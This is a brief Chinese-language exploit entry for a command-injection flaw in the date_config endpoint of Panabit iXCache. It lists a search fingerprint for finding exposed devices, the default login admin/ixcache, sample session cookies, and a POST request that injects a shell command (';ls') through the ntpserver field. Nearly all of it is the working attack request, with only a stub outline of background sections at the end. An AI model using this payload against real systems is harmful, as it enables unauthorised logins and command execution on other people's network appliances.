# PanabitiXCachedate_config存在后台命令执行漏洞

- **系统**：PanabitiXCachedate　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="iXCache"`
- **请求**：`POST /cgi-bin/Maintain/date_config HTTP/1.1`

**请求体 / payload**
```
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie
2. 使用上一步获取的cookie，执行命令（每次发包需要在登录处重新获取一次cookie）
Host:
Cookie: pauser_1626709857_644740=paonline_admin_48217_16289319551;Path=/;
Cookie: pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
ntpserver=0.0.0.0;ls&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
```

**其他**
- Panabit iXCache date\_config存在后台命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复习
***
- 版本: * Panabit iXCache